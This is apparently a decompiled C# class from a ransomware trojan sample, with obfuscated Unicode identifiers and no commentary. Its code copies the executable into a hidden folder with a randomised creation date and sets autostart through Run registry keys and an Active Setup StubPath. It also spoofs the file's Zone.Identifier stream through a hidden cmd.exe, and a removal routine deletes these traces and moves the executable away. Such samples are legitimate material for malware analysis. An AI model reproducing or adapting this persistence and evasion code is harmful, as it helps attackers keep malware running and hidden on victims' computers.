// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.ẖĽᒨᖕŮᎨ˽װ=̔͆ᲴߡঅиૢἙ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  internal class ẖĽᒨᖕŮᎨ\u02FDװ\u003D̔͆\u1CB4ߡঅиૢἙ
  {
    public static void ᗶᶕ\u0992Ըᮂē\u0E80ἙȘဍ\u192E1୬Ӻᖗ()
    {
      ẖĽᒨᖕŮᎨ\u02FDװ\u003D̔͆\u1CB4ߡঅиૢἙ.ɠॳ\u0381\u1979\u02C2ມHᩡ\u08BAΝݲ᳣ᒉ();
      ẖĽᒨᖕŮᎨ\u02FDװ\u003D̔͆\u1CB4ߡঅиૢἙ.\u0004ᕉᨼᢰᇀݼᘮᛄɿ\u0FDB();
      ẖĽᒨᖕŮᎨ\u02FDװ\u003D̔͆\u1CB4ߡঅиૢἙ.ϐሼ\u060A့\u0A5Fᛎݮޚᦌ();
    }

    private static void ɠॳ\u0381\u1979\u02C2ມHᩡ\u08BAΝݲ᳣ᒉ()
    {
      try
      {
        if (!Directory.Exists(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB))
          Directory.CreateDirectory(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB);
      }
      catch
      {
      }
      try
      {
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB, \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)), true);
      }
      catch
      {
      }
      try
      {
        if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ⴖ\u0E3E\u1CBDِᘮ)
        {
          Random random = new Random();
          int day = random.Next(1, 28);
          int month = random.Next(1, 12);
          int year = random.Next(2000, DateTime.Now.Year);
          Directory.SetCreationTime(Path.Combine(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB, \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)), new DateTime(year, month, day));
        }
      }
      catch
      {
      }
      if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0F99ᖳॡឿ᱙ଭങᄷ)
      {
        try
        {
          File.SetAttributes(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
        }
        catch
        {
        }
      }
      if (!\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ҽᤌᙏणᒷ\u0895ྜྷ\u08B5ɸ\u003B\u055Cḅଵ\u0A45\u060Aᬔ)
        return;
      try
      {
        File.SetAttributes(Path.Combine(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB, \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.ᴩ\u104Bс᳦͒ࡘ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
      }
      catch
      {
      }
    }

    public static void ϐሼ\u060A့\u0A5Fᛎݮޚᦌ()
    {
      try
      {
        if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ყ\u181DᨿᦹỈđ្)
          Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ဧૣݛࠧᑟ\u0489ஞᄆ, true), (object) (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB + "\\" + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)));
      }
      catch
      {
      }
      try
      {
        if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᯄᐤ\u1CBDፎᘫܭွѲకᤉྻୟᬧֳÛ\u1AF7\u00B2ᦒ)
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ဧૣݛࠧᑟ\u0489ஞᄆ, true), (object) (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB + "\\" + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)));
      }
      catch
      {
      }
      try
      {
        if (!\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.භ߄๋\u0A31\u1B5Aၞᓨᡍह\u177D᷃ṃ)
          return;
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᶠ\u0FC8ᣐẃ\u0834ᴙ\u124Eٵᰆᮯ᪖ᭊᝧಢ, true));
        subKey.SetValue("StubPath", (object) (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB + "\\" + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true)));
        subKey.SetValue("IsInstalled", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void \u0004ᕉᨼᢰᇀݼᘮᛄɿ\u0FDB()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          UseShellExecute = false,
          RedirectStandardInput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine("cd " + \u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0039ቶ\u0E75೭ݓʲвಆᄬᅡᅨ\u0DFC\u0AFB);
        standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u0E7AẼහ۠ν̒ਬɠ\u0027, true) + ":ZONE.identifier");
        standardInput.Close();
        process.Kill();
      }
      catch
      {
      }
    }

    public static void \u088C\u02F5\u09B3ḹȗ()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ဧૣݛࠧᑟ\u0489ஞᄆ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ủᦶੰᐐᒵᤨቑᡖẀ\u0E66ᦤધޭᠳḴ\u18F7, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.\u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᶠ\u0FC8ᣐẃ\u0834ᴙ\u124Eٵᰆᮯ᪖ᭊᝧಢ, true));
      }
      catch
      {
      }
      try
      {
        switch (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ś۶თ\u10CF\u0F0Bἒᯢਦѕࣸ\u1736)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.DeleteSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.DeleteSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ);
            break;
        }
      }
      catch
      {
      }
      ẖĽᒨᖕŮᎨ\u02FDװ\u003D̔͆\u1CB4ߡঅиૢἙ.ቯᐶᜱᗔ௦Fݨᶄ಼ᝇ\u0EFD\u12C6դ();
    }

    public static void ቯᐶᜱᗔ௦Fݨᶄ಼ᝇ\u0EFD\u12C6դ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        File.Move(Process.GetCurrentProcess().MainModule.FileName, tempFileName);
        \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.ӚᴏᜱଧឰП\u058Aӟᒉ୨ปᵐኈṬᷧᘊ(tempFileName, (string) null, \u1064ᘗȩࠈዮȼࣣ͟ჾẬᦢ\u0DCB̌ᓆޓì\u058E.ܦᎯᔫՄ\u18AB\u0A54בᤖᘾ᭮\u18ADݔुKં.\u09C0ΖÎଛᵞ\u0EEFƦЕ);
      }
      catch (Exception ex)
      {
      }
    }

    public enum \u0FD5ẗռ\u083Bᗽ\u0F0Cᙉ\u0866ଢཛጇጋ\u07F8ृ᷐
    {
      \u1808એᬺ\u0EFEెᇸଶᏋជᇰ\u0BF1ˁࠩۑ\u055Aᱚԓ,
      \u0ACDϗࣵǱ\u0866ጲ\u1B4Fਉऔߖˌ\u181AណᵥỴኢṾѮᛋ,
      ੲᴝ\u1361ჱ\u0FF4Ќ̛ᎈ\u003Dѐ\u0A00ᗭ\u0DF8॔ᶵ,
    }
  }
}
